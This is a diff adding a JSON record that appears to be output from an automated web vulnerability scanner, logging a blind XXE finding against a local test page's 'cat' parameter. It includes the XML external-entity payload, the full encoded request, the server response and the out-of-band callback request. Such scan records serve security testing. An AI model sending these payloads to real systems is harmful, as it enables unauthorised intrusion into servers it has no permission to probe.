@@ -1,0 +1,36 @@
+[
+  {
+    "create_time": 1703958418517,
+    "detail": {
+      "addr": "http://localhost:8080/listproducts.php?cat=1",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY content SYSTEM \"XRAY_RURL\">]><a>&content;</a>",
+      "snapshot": [
+        [
+          "GET /listproducts.php?cat=%3C%3Fxml+version%3D%221.0%22%3F%3E%3C%21DOCTYPE+ANY+%5B%3C%21ENTITY+content+SYSTEM+%22http%3A%2F%2F0.0.0.0%3A8003%2Fi%2F94fc7a%2F218e%2Fxgvh%2F%22%3E%5D%3E%3Ca%3E%26content%3B%3C%2Fa%3E HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept-Encoding: gzip\r\n\r\n",
+          "HTTP/1.1 200 OK\r\nContent-Length: 23\r\nContent-Type: text/html;charset=ISO-8859-1\r\nDate: Sat, 30 Dec 2023 17:46:57 GMT\r\nServer: Apache-Coyote/1.1\r\nX-Frame-Options: DENY\r\n\r\n<html>1111111111</html>"
+        ]
+      ],
+      "extra": {
+        "param": {
+          "key": "cat",
+          "position": "query",
+          "value": "<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY content SYSTEM \"http://0.0.0.0:8003/i/94fc7a/218e/xgvh/\">]><a>&content;</a>"
+        },
+        "remote_ip": "127.0.0.1:41204",
+        "remote_request": "GET /i/94fc7a/218e/xgvh/ HTTP/1.1\r\nHost: 0.0.0.0:8003\r\nAccept-Encoding: gzip\r\nUser-Agent: Go-http-client/1.1\r\n\r\n"
+      }
+    },
+    "plugin": "xxe/xxe/blind",
+    "target": {
+      "url": "http://localhost:8080/listproducts.php",
+      "params": [
+        {
+          "position": "query",
+          "path": [
+            "cat"
+          ]
+        }
+      ]
+    }
+  }
+]
